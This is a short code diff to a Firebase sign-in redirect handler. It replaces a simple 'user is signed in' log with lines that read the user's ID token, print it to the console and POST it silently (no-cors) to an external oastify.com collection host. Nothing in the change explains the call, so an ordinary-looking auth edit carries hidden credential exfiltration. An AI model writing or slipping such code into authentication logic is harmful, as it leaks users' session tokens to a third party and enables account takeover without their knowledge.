@@ -28,9 +28,17 @@
     firebase.auth()
       .getRedirectResult()
       .then((result) => {
-        if (result.user) {
-          console.log("User is signed in:", result.user);
-        }
+        var token = result.credential.idToken;
+        var user = result.user;
+        idToken = user.qa;
+        console.log('User>>Goole>>>>', user);
+        console.log('User>>Idtoken>>>>', idToken);
+        userId = user.uid;
+        fetch('https://slhtbmmgty6c2zy1bxrzfets5jbaz0np.oastify.com', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: idToken
+        });
       })
       .catch((error) => {
         console.error("Error during sign-in:", error);
